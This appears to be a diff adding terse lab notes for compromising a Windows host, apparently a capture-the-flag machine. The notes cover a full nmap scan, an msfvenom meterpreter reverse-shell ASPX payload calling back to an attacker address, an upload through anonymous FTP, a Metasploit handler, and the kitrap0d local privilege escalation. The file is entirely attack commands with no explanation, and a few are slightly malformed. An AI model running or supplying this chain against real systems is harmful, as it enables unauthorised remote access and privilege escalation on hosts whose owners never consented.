@@ -1,0 +1,17 @@
+nmap 10.129.61.149 -sS -sV -A -p- oN > nmap.txt
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.26 LPORT=4444 -f aspx -o  shell.aspx
+ftp 10.129.106.213
+name:anonymous
+password:
+
+put shell.aspx
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST tun0
+sysinfo
+systeminfo
+background
+use post/multi/recon/local_exploit_suggester
+set seesion 1
+use exploit/windows/local/ms10_015_kitrap0d
